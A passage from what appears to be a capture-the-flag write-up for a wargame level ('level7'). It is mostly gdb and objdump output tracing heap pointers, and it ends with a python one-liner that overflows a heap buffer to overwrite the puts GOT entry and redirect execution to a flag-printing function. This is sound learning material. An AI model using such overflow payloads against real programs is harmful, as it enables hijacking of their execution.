We see we have a pointer to a pointer that will write on the heap, and just after the first pointer, we have the second pointer that points to an address on the heap. So we thought: why not overwrite the second pointer with the address of the `puts` function, and then write into the `puts` address the address of the `m` function that should print out the flag for us. \
Lets try:
```shell
$ objdump -R ./level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
|_ the address we want to write in the address of the m function
$ gdb ./level7
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
				      |_ the address we want to write
(gdb) b *main+132       (breakpoint just after the strcpy)
Breakpoint 1 at 0x80485a5
(gdb) r 'test' 'test2'
Starting program: /home/user/level7/level7 'test' 'test2'

Breakpoint 1, 0x080485a5 in main ()
(gdb) disas
...
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax   -> first pointer (esp+0x1c)
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx -> pointer stored in (esp+0x1c)+4
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax -> second pointer (esp+0x18)
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax 
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx  -> pointer stored in (esp+0x18)+4
...
(gdb) x/wx $esp+0x1c
0xbffff6dc:	0x0804a008
(gdb) x/24wx 0x804a00c (the address + 4 bytes to get to our actual first pointer)
0x804a00c:	0x0804a018	0x00000000	0x00000011	0x74736574
                |_ this will be the location of the first copy
0x804a01c:	0x00000000	0x00000000	0x00000011	0x00000002
0x804a02c:	0x0804a038	0x00000000	0x00000011	0x00000000
                |_ this should be the location of the second copy
...
(gdb) x/24wx 0x804a018
0x804a018:	0x74736574	0x00000000	0x00000000	0x00000011
		|_ this is our first string
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
                                |_ if we overwrite this, we can write anywhere we want
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
                |_ this is our second string for now, but it will be moved
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) quit
$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1578581921
```
